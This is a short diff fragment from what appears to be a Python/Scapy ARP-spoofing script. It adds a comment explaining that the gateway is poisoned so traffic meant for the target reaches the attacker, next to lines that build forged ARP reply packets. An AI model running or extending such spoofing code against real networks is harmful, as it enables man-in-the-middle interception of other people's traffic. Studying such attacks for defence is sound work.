@@ -28,6 +28,7 @@ poisonedTarget.op = 2
 poisonedTarget.psrc = "192.168.2.1"
 
 
+# Poison the gateway - make it think that it sends the traffic to the target, but instead send it to us;
 poisonedGateway = ARP()
 poisonedGateway.op = 2
 poisonedGateway.pdst = "192.168.2.1"
